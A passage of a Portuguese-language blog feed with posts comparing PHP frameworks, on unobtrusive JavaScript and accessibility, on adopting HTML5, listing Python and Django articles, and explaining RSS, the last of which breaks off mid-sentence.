&lt;p&gt;Se você já desenvolve em &lt;em&gt;&lt;a href="http://www.ruby-lang.org/pt/" title="Conheça a linguagem Ruby"&gt;Ruby&lt;/a&gt; (on Rails)&lt;/em&gt; e necessita passear pelo
mundo do &lt;em&gt;PHP&lt;/em&gt;, &lt;em&gt;Akelos&lt;/em&gt; é uma boa pedida. Na minha opinião, se você não
tem nenhuma ligação com &lt;em&gt;Ruby&lt;/em&gt;, recomendo experimentar outros
&lt;em&gt;frameworks&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.akelos.org/" title="Página oficial do projeto Akelos"&gt;Conheça o &lt;em&gt;Akelos Framework&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Cozinhando aplicações em CakePHP&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/cake-logo.png" width="180" height="180" title="Logotipo do framework CakePHP" alt="Logotipo do framework CakePHP"&gt;&lt;/p&gt;
&lt;p&gt;Posso considerar a &lt;em&gt;CakePHP&lt;/em&gt; o meu &lt;strong&gt;&lt;em&gt;framework&lt;/em&gt; “oficial”&lt;/strong&gt; para &lt;em&gt;PHP&lt;/em&gt;.
Para começar a sua página oficial já chama a atenção pelo visual e pela disposição de conteúdo.&lt;/p&gt;
&lt;p&gt;A premissa da &lt;em&gt;CakePHP&lt;/em&gt; é “rapid development”. Já publiquei alguns
projetos em &lt;em&gt;Cake&lt;/em&gt; e devo admitir que ela lhe agrega uma produtividade
excepcional sem criar complexidade desnecessária.&lt;/p&gt;
&lt;p&gt;O que me chamou a atenção, em relação aos outros &lt;em&gt;frameworks&lt;/em&gt;
que testei, foi o seu esquema de &lt;strong&gt;&lt;em&gt;ORM&lt;/em&gt;&lt;/strong&gt;. Agregado ao seu mecanismo de
&lt;em&gt;scaffolding&lt;/em&gt;, torna nossa vida muito mais simples em relação a
construção de modelos de dados, formulários e consultas.&lt;/p&gt;
&lt;p&gt;A documentação é muito boa, e existem vários componentes de terceiros
que a fazem uma das escolhas mais certeiras para o seu ambiente de
desenvolvimento em &lt;em&gt;PHP&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://cakephp.org/" title="Página oficial do projeto CakePHP"&gt;Conheça a &lt;em&gt;CakePHP Framework&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Injetando combustível com CodeIgniter&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/codeigniter-logo.png" width="180" height="180" title="Logotipo do framework CodeIgniter" alt="Logotipo do framework CodeIgniter"&gt;&lt;/p&gt;
&lt;p&gt;Antes de mais nada, devo dizer que só utilizo “oficialmente” a &lt;em&gt;CakePHP&lt;/em&gt; por
causa do seu &lt;em&gt;ORM&lt;/em&gt;. Caso contrário, sem dúvida nenhuma, seria usuário assíduo do
&lt;em&gt;CodeIgniter&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Ele é um &lt;em&gt;framework&lt;/em&gt; &lt;strong&gt;muito legal&lt;/strong&gt;, pelo fato de ser mais abrangente
que os dois &lt;em&gt;frameworks&lt;/em&gt; citados anteriormente. Como assim “abrangente”? Explico:
&lt;em&gt;CodeIgniter&lt;/em&gt; &lt;strong&gt;faz menos coisas para você&lt;/strong&gt; que a &lt;em&gt;Akelos&lt;/em&gt;, &lt;em&gt;Cake&lt;/em&gt; ou
&lt;em&gt;Zend&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Se você está pensando que isto é uma desvantagem, está enganado. O &lt;em&gt;CI&lt;/em&gt;
é um &lt;em&gt;framework&lt;/em&gt; extremamente simples de usar. Gostei muito e recomendo
sem dó. Para aqueles projetos em que você quer ter total controle sobre
tudo o que ocorre em cada região da sua aplicação… &lt;em&gt;CI&lt;/em&gt; é uma excelente
pedida.&lt;/p&gt;
&lt;p&gt;A sua documentação é muito boa, e talvez seja um grande fator positivo
para a escolha da ferramenta. Ela não é tão “rapid development” quanto a
&lt;em&gt;Cake&lt;/em&gt;, mas garante uma produtividade incrível e um prazer indescritível
em programar em &lt;em&gt;PHP&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Muito provável que eu volte a utilizá-lo em outros projetos.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://codeigniter.com/" title="Página oficial do projeto CodeIgniter"&gt;Conheça a &lt;em&gt;CodeIgniter&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;O poderio do famoso Zend Framework&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/zend-framework-logo.png" width="180" height="180" title="Logotipo do Zend Framework" alt="Logotipo do Zend Framework"&gt;&lt;/p&gt;
&lt;p&gt;O meu contato com o &lt;em&gt;Zend Framework&lt;/em&gt; foi um tanto superficial, mas isso já me
dá propriedade para dizer: de todos as citados é o &lt;em&gt;framework&lt;/em&gt; mais poderoso.&lt;/p&gt;
&lt;p&gt;Para ser sincero não tenho motivos para não usar o &lt;em&gt;Zend&lt;/em&gt;, acredito que
a &lt;em&gt;Cake&lt;/em&gt; seja mais simples e “rapid”, por isso da minha escolha. Mas
conheço algumas agências &lt;em&gt;Web&lt;/em&gt; que a adotaram como ferramenta de
desenvolvimento seguindo a lógica: &lt;strong&gt;excelente documentação&lt;/strong&gt;,
&lt;strong&gt;excelente suporte&lt;/strong&gt;, &lt;strong&gt;excelente participação da comunidade&lt;/strong&gt;. Para se
ter ideia, o &lt;em&gt;Zend&lt;/em&gt; já possui livros escritos por autores brasileiros,
fora a bibliografia estrangeira que também é muito boa.&lt;/p&gt;
&lt;p&gt;Usei &lt;em&gt;Zend&lt;/em&gt; (na verdade prestei suporte a um projeto existente) em um
&lt;em&gt;blog&lt;/em&gt; com bom número de visitas diárias, utilizando um banco
&lt;em&gt;Postgres&lt;/em&gt;. E talvez isso tenho refletido na minha escolha, pois o autor
do código não sabia utilizar o esquema de &lt;em&gt;ORM&lt;/em&gt; do &lt;em&gt;Zend&lt;/em&gt;, fazendo com
que instruções referentes a consultas (que deveriam estar em modelos,
seguindo o &lt;em&gt;MVC&lt;/em&gt;) estavam nos controladores, o que deixava o código
“macarrônico” demais para o meu gosto.&lt;/p&gt;
&lt;p&gt;Mas é uma excelente ferramenta, possui um esquema de validadores muito
bom, e embora pareça um pouco complexa de início, com a prática você
acaba desmistificando e apaixonando-se por este &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://framework.zend.com/" title="Página oficial do projeto Zend Framework"&gt;Conheça o &lt;em&gt;Zend Framework&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Como você pode ver, este papo de que o ambiente de desenvolvimento &lt;em&gt;PHP&lt;/em&gt;
é “pobre” é lenda.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="php"></category><category term="frameworks"></category><category term="akelos"></category><category term="cakephp"></category><category term="codeigniter"></category><category term="zend framework"></category></entry><entry><title>Garantindo acessibilidade com Javascript não obstrusivo</title><link href="https://klauslaube.com.br/2010/11/18/acessibilidade-javascript-nao-obstrusivo.html" rel="alternate"></link><published>2010-11-18T09:00:00-02:00</published><updated>2010-11-18T09:00:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-11-18:/2010/11/18/acessibilidade-javascript-nao-obstrusivo.html</id><summary type="html">&lt;p&gt;Em épocas onde &lt;em&gt;RIA&lt;/em&gt; está cada vez mais comum, e as interfaces &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; resolveram
parecer-se cada vez mais com ambientes &lt;em&gt;desktops&lt;/em&gt;, tenho reparado um
grande movimento a favor da acessibilidade, afinal, como bons
profissionais que somos temos que garantir que a informação que estamos
disponibilizando seja acessada por uma gama …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Em épocas onde &lt;em&gt;RIA&lt;/em&gt; está cada vez mais comum, e as interfaces &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; resolveram
parecer-se cada vez mais com ambientes &lt;em&gt;desktops&lt;/em&gt;, tenho reparado um
grande movimento a favor da acessibilidade, afinal, como bons
profissionais que somos temos que garantir que a informação que estamos
disponibilizando seja acessada por uma gama de pessoas, inclusive
aquelas com necessidades especiais.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Preocupe-se com a acessibilidade&lt;/h2&gt;
&lt;p&gt;Quando você lê “&lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; não obstrusivo”, você está lendo que
uma aplicação &lt;em&gt;web&lt;/em&gt;, mesmo que recheada de requisições &lt;em&gt;Ajax&lt;/em&gt;, possa
funcionar em navegadores mais modestos (como o &lt;a href="http://pt.wikipedia.org/wiki/Lynx_(navegador)" title="Não conhece o Lynx?"&gt;&lt;em&gt;Lynx&lt;/em&gt;&lt;/a&gt;, dispositivos
&lt;em&gt;mobile&lt;/em&gt;, navegadores específicos para pessoas com necessidades
especiais (leitores de tela, por exemplo) ou até mesmo em outras
máquinas (no caso de serviços &lt;em&gt;web&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.tableless.com.br/principais-pontos-da-acessibilidade-na-web" title="Principais pontos da Acessibilidade na Web"&gt;&lt;em&gt;Diego Eis (do Tableless)&lt;/em&gt;&lt;/a&gt; comenta que para garantir
acessibilidade em suas aplicações &lt;em&gt;web&lt;/em&gt; é necessário que:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Funcione em diversos dispositivos (&lt;em&gt;handhelds&lt;/em&gt;, &lt;em&gt;WebTV&lt;/em&gt;, &lt;em&gt;tablets&lt;/em&gt;, etc);&lt;/li&gt;
&lt;li&gt;Funcione em várias plataformas (&lt;em&gt;Windows&lt;/em&gt;, &lt;em&gt;Linux&lt;/em&gt;, &lt;em&gt;Mac&lt;/em&gt;, etc);&lt;/li&gt;
&lt;li&gt;Funcione em diversos navegadores;&lt;/li&gt;
&lt;li&gt;Seja acessível por todos os tipos de pessoas (incluindo pessoas com deficiência motora ou visual).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A pergunta que não quer calar: Como posso fazer da minha aplicação
&lt;em&gt;web&lt;/em&gt;, que tem centenas de eventos &lt;em&gt;Javascript&lt;/em&gt; e centenas de
requisições &lt;em&gt;Ajax&lt;/em&gt;, ser “não obstrusiva”?&lt;/p&gt;
&lt;h2&gt;Não deixe que o Javascript interfira na informação&lt;/h2&gt;
&lt;p&gt;Quem vem do &lt;em&gt;xHTML&lt;/em&gt; já tem por hábito separar o &lt;em&gt;front-end&lt;/em&gt; em três
áreas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Informação (conteúdo)&lt;/li&gt;
&lt;li&gt;Estilos (aparência)&lt;/li&gt;
&lt;li&gt;Comportamento (interação)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Podemos chamá-las de &lt;strong&gt;camadas&lt;/strong&gt; se preferir. O importante é que uma
área deve impactar o mínimo possível sobre a outra (ou seja, interferir
“diretamente”). Isto é possível eliminando o uso de instruções &lt;em&gt;inline&lt;/em&gt;,
usando folhas de estilos ao invés de instruções &lt;em&gt;style&lt;/em&gt; e adicionando
eventos ao &lt;em&gt;Javascript&lt;/em&gt; através de métodos da linguagem (e não atributos
dos elementos &lt;em&gt;HTML&lt;/em&gt; como o &lt;em&gt;onClick&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Pode parecer difícil enriquecer uma aplicação e preocupar-se com
acessibilidade, mas faça o seguinte:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Comece com um &lt;em&gt;HTML&lt;/em&gt; bem escrito (e semântico)&lt;/li&gt;
&lt;li&gt;Construa a aparência através de folhas de estilos externas (de preferência)&lt;/li&gt;
&lt;li&gt;Aplique o comportamento necessário através de &lt;em&gt;scripts&lt;/em&gt; externos (de preferência)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O &lt;a href="http://www.igorescobar.com/blog/" title="Visite o blog do Igor Escobar"&gt;&lt;em&gt;Igor Escobar&lt;/em&gt;&lt;/a&gt; fez um &lt;em&gt;post&lt;/em&gt; com uma apresentação de &lt;em&gt;Simon
Willison&lt;/em&gt; onde é explicado &lt;a href="http://www.igorescobar.com/blog/2009/10/26/javascript-nao-obstrutivo-com-jquery/" title="Javascript não obstrusivo com jQuery"&gt;como fazer &lt;em&gt;Javascript&lt;/em&gt; não obstrusivo com
&lt;em&gt;jQuery&lt;/em&gt;&lt;/a&gt;. A prática acima (e mencionada
na apresentação) é conhecida por &lt;em&gt;Progressive Enhancement&lt;/em&gt;, e você pode ler
mais sobre no &lt;a href="http://www.alistapart.com/articles/understandingprogressiveenhancement/" title="Understanding Progressive Enhancement"&gt;&lt;em&gt;A List Apart&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;noscript?&lt;/h2&gt;
&lt;p&gt;Se construirmos uma aplicação ou &lt;em&gt;website&lt;/em&gt; que funciona dentro da
&lt;em&gt;Progressive Enhancement&lt;/em&gt;, temos um &lt;em&gt;website&lt;/em&gt; ou aplicação que não
obrigará o usuário a ter todos os recursos da &lt;em&gt;CSS&lt;/em&gt; ou do &lt;em&gt;Javascript&lt;/em&gt;
totalmente funcionais em seu navegador. Temos uma aplicação que
funcionará mesmo se o navegador do usuário não suporte &lt;em&gt;Javascript&lt;/em&gt;.
Logo, &lt;strong&gt;(na minha opinião)&lt;/strong&gt; não é necessário o uso da tag
&lt;strong&gt;\&amp;lt;noscript&gt;&lt;/strong&gt;, afinal o usuário não será “prejudicado” ou isento de
qualquer tipo de informação que nossa aplicação se disponha a exibir.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Mesmo que a sua aplicação seja para um público muito específico,
preocupe-se com a acessibilidade. Você, seus clientes e a sociedade só
tem a ganhar.&lt;/p&gt;
&lt;p&gt;Finalizando… é interessante notar que qualquer boa-prática que envolva o
desenvolvimento &lt;em&gt;Web&lt;/em&gt; está diretamente ligada com um &lt;em&gt;HTML&lt;/em&gt; bem escrito,
e acima de tudo, com a &lt;strong&gt;semântica&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="javascript"></category><category term="acessibilidade"></category></entry><entry><title>Usando o HTML5 sem medo</title><link href="https://klauslaube.com.br/2010/11/13/usando-html5-sem-medo.html" rel="alternate"></link><published>2010-11-13T11:30:00-02:00</published><updated>2010-11-13T11:30:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-11-13:/2010/11/13/usando-html5-sem-medo.html</id><summary type="html">&lt;p&gt;É notável como gradativamente a gente vem ouvindo cada vez mais sobre
&lt;em&gt;HTML5&lt;/em&gt; e &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS3"&gt;&lt;em&gt;CSS3&lt;/em&gt;&lt;/a&gt;. Os sites com experimentos não param de aparecer na
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, muitas referências boas com excelentes dicas sobre escrita e
semântica, e até mesmo &lt;em&gt;websites&lt;/em&gt; profissionais (desenvolvidos por
empresas da área do desenvolvimento &lt;em&gt;web&lt;/em&gt;), começam a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;É notável como gradativamente a gente vem ouvindo cada vez mais sobre
&lt;em&gt;HTML5&lt;/em&gt; e &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS3"&gt;&lt;em&gt;CSS3&lt;/em&gt;&lt;/a&gt;. Os sites com experimentos não param de aparecer na
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, muitas referências boas com excelentes dicas sobre escrita e
semântica, e até mesmo &lt;em&gt;websites&lt;/em&gt; profissionais (desenvolvidos por
empresas da área do desenvolvimento &lt;em&gt;web&lt;/em&gt;), começam a tornar-se cada vez
mais comuns.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas é óbvio que o &lt;em&gt;HTML5&lt;/em&gt; não está maduro o bastante para simplesmente
abandonarmos a cautela e acharmos que todo o nosso público utiliza
&lt;a href="http://www.google.com/chrome?hl=pt-BR" title="Baixe o Google Chrome gratuitamente"&gt;&lt;em&gt;Google Chrome&lt;/em&gt;&lt;/a&gt;. Na verdade, acredito que os desenvolvedores &lt;em&gt;Web&lt;/em&gt;
já aprenderam muito com o &lt;em&gt;IE 6&lt;/em&gt; (e &lt;a href="http://www.tableless.com.br/aonde-nos-leva-a-morte-do-internet-explorer-6" title="Aonde nos leva a morte do IE6?"&gt;vibraram muito com a sua morte&lt;/a&gt;)
para cometer este tipo de equívoco de novo.&lt;/p&gt;
&lt;p&gt;Mas então, até onde podemos “arriscar” no &lt;em&gt;HTML5&lt;/em&gt; e &lt;em&gt;CSS3&lt;/em&gt;? Quando
poderemos enfim falar para os nossos clientes que utilizaremos &lt;em&gt;HTML5&lt;/em&gt;
nos sites deles?&lt;/p&gt;
&lt;p&gt;O site &lt;a href="http://caniuse.com/" title="Quando poderemos usar plenamente o HTML5?"&gt;&lt;em&gt;When can I use…&lt;/em&gt;&lt;/a&gt; pode responder esta pergunta para você!&lt;/p&gt;
&lt;p&gt;Ele apresenta alguns recursos da &lt;em&gt;HTML5&lt;/em&gt; e &lt;em&gt;CSS3&lt;/em&gt; e qual a previsão de suporte para
determinado navegador (&lt;em&gt;IE&lt;/em&gt;, &lt;em&gt;Opera&lt;/em&gt;, &lt;em&gt;Safari&lt;/em&gt;, &lt;em&gt;Firefox&lt;/em&gt; e &lt;em&gt;Chrome&lt;/em&gt;).
Por exemplo, segundo o site, o &lt;em&gt;IE&lt;/em&gt; só terá suporte nativo ao &lt;em&gt;Canvas&lt;/em&gt;
em sua versão 9.&lt;/p&gt;
&lt;h2&gt;Mas dá pra usar ou não?&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/we-can-do-html5.jpg" width="192" height="245" title="Comunidade Drupal incentivando ao uso do HTML5" alt="Comunidade Drupal incentivando ao uso do HTML5"&gt;&lt;/p&gt;
&lt;p&gt;Já utilizei &lt;em&gt;HTML5&lt;/em&gt; em alguns projetos. Devo confidenciar que foram projetos “na
surdina”, ou seja, os clientes e demais envolvidos não sabiam que o
desenvolvimento estava sendo feito em &lt;em&gt;HTML5&lt;/em&gt; (sendo revelado somente
depois de concluído). Como fiz para utilizar a &lt;em&gt;HTML5&lt;/em&gt; sem me preocupar
com &lt;em&gt;IE&lt;/em&gt;? Bom, por mim eu simplesmente ignoraria o &lt;em&gt;IE&lt;/em&gt;, mas
comercialmente falando isto seria um tiro no pé.&lt;/p&gt;
&lt;p&gt;Então assistindo a uma &lt;a href="http://elcio.com.br/amanha-cafe-com-browser-sobre-html/" title="Eu assisti ao Café com Browser pela internet"&gt;conferência da &lt;em&gt;W3C&lt;/em&gt; Brasil&lt;/a&gt;, o &lt;a href="http://elcio.com.br/" title="Visite o blog do Elcio"&gt;&lt;em&gt;Elcio&lt;/em&gt;&lt;/a&gt; do
&lt;a href="http://www.tableless.com.br/" title="Desenvolvimento Web com XHTML e CSS"&gt;&lt;em&gt;Tableless&lt;/em&gt;&lt;/a&gt; mostrou algumas soluções para quem enfrenta o dilema de
fazer funcionar nos bons e nos maus navegadores.&lt;/p&gt;
&lt;p&gt;Primeiramente, deixa eu parabenizar o &lt;em&gt;Tableless&lt;/em&gt; pelo excelente
“&lt;a href="http://tableless.com.br/html5/" title="Saiba tudo sobre HTML5 no Tableless"&gt;&lt;em&gt;HTML5&lt;/em&gt; – Guia de referência para os desenvolvedores &lt;em&gt;web&lt;/em&gt;&lt;/a&gt;”. É
justamente neste guia, mais exatamente no capítulo 2, que são
apresentadas técnicas de detecção para sabermos se o &lt;em&gt;browser&lt;/em&gt; do
internauta suporta determinado recurso ou não.&lt;/p&gt;
&lt;p&gt;Outra excelente referência é o &lt;a href="http://diveintohtml5.org/" title="Mergulhe no HTML5 agora mesmo"&gt;&lt;em&gt;Dive into HTML5&lt;/em&gt;&lt;/a&gt;. Onde, além dos
conceitos somos levados à prática em um material muito bem escrito e
divertido.&lt;/p&gt;
&lt;p&gt;Utilizando estas técnicas eu digo: É possível sim! Mas tenha em mente
que muitas coisas ainda são &lt;em&gt;Drafts&lt;/em&gt;, ou seja, amanhã simplesmente podem
deixar de existir (o que já aconteceu). Então não invente… use sem medo
essa nova safra de elementos como &lt;em&gt;article&lt;/em&gt;, &lt;em&gt;section&lt;/em&gt;, &lt;em&gt;aside&lt;/em&gt;, etc.
Também experimente as &lt;em&gt;tags&lt;/em&gt; &lt;em&gt;video&lt;/em&gt; e &lt;em&gt;audio&lt;/em&gt;, elementos &lt;em&gt;canvas&lt;/em&gt; e
brinque com o &lt;em&gt;localStorage&lt;/em&gt;, mas evite recursos muito “extravagantes”.&lt;/p&gt;
&lt;p&gt;Para finalizar, visitem o “&lt;a href="http://www.w3avenue.com/2010/05/07/html5-unleashed-tips-tricks-and-techniques/" title="HTML5 Unleashed: Tips, Tricks and Techniques"&gt;&lt;em&gt;HTML5 Unleashed: Tips, Tricks and
Techniques&lt;/em&gt;&lt;/a&gt;”. É um megaboga tutorial de &lt;em&gt;HTML5&lt;/em&gt; que aborda desde os
elementos “mais seguros” até técnicas para detecção e para renderização
no &lt;em&gt;IE&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;E vamos aguardar o &lt;a href="http://www.livrohtml5.com.br/" title="Ficamos no aguardo do livro do Maujor sobre HTML5"&gt;livro do &lt;em&gt;Maujor&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="html5"></category><category term="css3"></category><category term="web"></category></entry><entry><title>Motive-se: Por que usar Python e Django?</title><link href="https://klauslaube.com.br/2010/11/12/motive-se-por-que-usar-python-e-django.html" rel="alternate"></link><published>2010-11-12T20:20:00-02:00</published><updated>2010-11-12T20:20:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-11-12:/2010/11/12/motive-se-por-que-usar-python-e-django.html</id><summary type="html">&lt;p&gt;Se você ainda está em dúvida sobre utilizar &lt;a href="http://www.python.org/" title="Site oficial do Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;
e &lt;a href="http://www.djangoproject.com/" title="Site oficial do Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, abaixo
segue uma compilação dos &lt;em&gt;posts&lt;/em&gt; que já fiz
ao &lt;a href="http://www.profissionaisti.com.br/author/klaus/" title="Minhas contribuições ao Profissionais TI"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;
sobre esta fantástica linguagem de programação que é o &lt;em&gt;Python&lt;/em&gt;, e esta
maravilhosa &lt;em&gt;framework&lt;/em&gt; chamada &lt;em&gt;Django&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/01/10-motivos-para-voce-aprender-a-programar-em-python/" title="Leia este post no Profissionais TI"&gt;10 motivos para você aprender a programar em Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/06/pense-como-um-pythonista/" title="Leia este post no Profissionais TI"&gt;Pense como …&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;Se você ainda está em dúvida sobre utilizar &lt;a href="http://www.python.org/" title="Site oficial do Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;
e &lt;a href="http://www.djangoproject.com/" title="Site oficial do Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, abaixo
segue uma compilação dos &lt;em&gt;posts&lt;/em&gt; que já fiz
ao &lt;a href="http://www.profissionaisti.com.br/author/klaus/" title="Minhas contribuições ao Profissionais TI"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;
sobre esta fantástica linguagem de programação que é o &lt;em&gt;Python&lt;/em&gt;, e esta
maravilhosa &lt;em&gt;framework&lt;/em&gt; chamada &lt;em&gt;Django&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/01/10-motivos-para-voce-aprender-a-programar-em-python/" title="Leia este post no Profissionais TI"&gt;10 motivos para você aprender a programar em Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/06/pense-como-um-pythonista/" title="Leia este post no Profissionais TI"&gt;Pense como um Pythonista&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/06/codifique-como-um-verdadeiro-pythonista/" title="Leia este post no Profissionais TI"&gt;Codifique como um verdadeiro Pythonista&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/02/programador-python-aprendendo-java/" title="Leia este post no Profissionais TI"&gt;Programador Python aprendendo Java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/03/python-seja-hibrido-use-dialetos/" title="Leia este post no Profissionais TI"&gt;Python: Seja híbrido! Use dialetos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/02/programando-python-para-a-web/" title="Leia este post no Profissionais TI"&gt;Programando Python para a Web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/02/programando-em-django-no-seu-sistema-operacional-favorito/" title="Leia este post no Profissionais TI"&gt;Programando em Django no seu SO favorito&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/05/desenvolvendo-web-com-django-por-onde-comecar/" title="Leia este post no Profissionais TI"&gt;Desenvolvendo Web com Django: Por onde começar?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.profissionaisti.com.br/2009/04/entendendo-o-django/" title="Leia este post no Profissionais TI"&gt;Entendendo o Django&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Você possui algum link interessante para compartilhar? Nos mostre deixando um comentário...&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="python"></category><category term="django"></category></entry><entry><title>O que é RSS?</title><link href="https://klauslaube.com.br/2010/11/12/o-que-e-rss.html" rel="alternate"></link><published>2010-11-12T20:15:00-02:00</published><updated>2010-11-12T20:15:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-11-12:/2010/11/12/o-que-e-rss.html</id><summary type="html">&lt;p&gt;Conheço pessoas “bem instruídas” em &lt;em&gt;TI&lt;/em&gt; que simplesmente não sabem o que é &lt;em&gt;RSS&lt;/em&gt;.
Esta é a minha motivação para escrever este “primeiro post oficial” e lhe explicar,
caso você não saiba, como você pode ler o conteúdo deste &lt;em&gt;blog&lt;/em&gt; sem visitar este endereço.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;In a nutshell…&lt;/h2&gt;
&lt;p&gt;Primeiramente quero deixar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Conheço pessoas “bem instruídas” em &lt;em&gt;TI&lt;/em&gt; que simplesmente não sabem o que é &lt;em&gt;RSS&lt;/em&gt;.
Esta é a minha motivação para escrever este “primeiro post oficial” e lhe explicar,
caso você não saiba, como você pode ler o conteúdo deste &lt;em&gt;blog&lt;/em&gt; sem visitar este endereço.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;In a nutshell…&lt;/h2&gt;
&lt;p&gt;Primeiramente quero deixar claro que gosto muito de &lt;em&gt;pageviews&lt;/em&gt;. Fique a vontade
para visitar este &lt;em&gt;blog&lt;/em&gt; quando e quantas vezes quiser :)&lt;/p&gt;
&lt;p&gt;Segundo a &lt;a href="http://pt.wikipedia.org/" title="Visite a Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RSS (Really Simple Syndication) é um subconjunto de “dialetos” XML que servem para agregar conteúdo ou “Web syndication“, podendo ser acessado mediante programas ou sites agregadores. É usado principalmente em sites de notícias e blogs.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Bom… este é um &lt;em&gt;blog&lt;/em&gt;! E este é nosso &lt;a href="http://www.klauslaube.com.br/feed/rss.xml" title="Confira o nosso feed RSS"&gt;&lt;em&gt;link RSS&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Logo, você é capaz de receber os artigos que publico aqui em seu leitor &lt;em&gt;RSS&lt;/em&gt;
favorito. Não viu vantagem nenhuma nisto?&lt;/p&gt;
&lt;h2&gt;RSS na prática&lt;/h2&gt;
&lt;p&gt;Você é um cara antenado, toda a manhã você visita os mais variados &lt;em&gt;blogs&lt;/em&gt; e
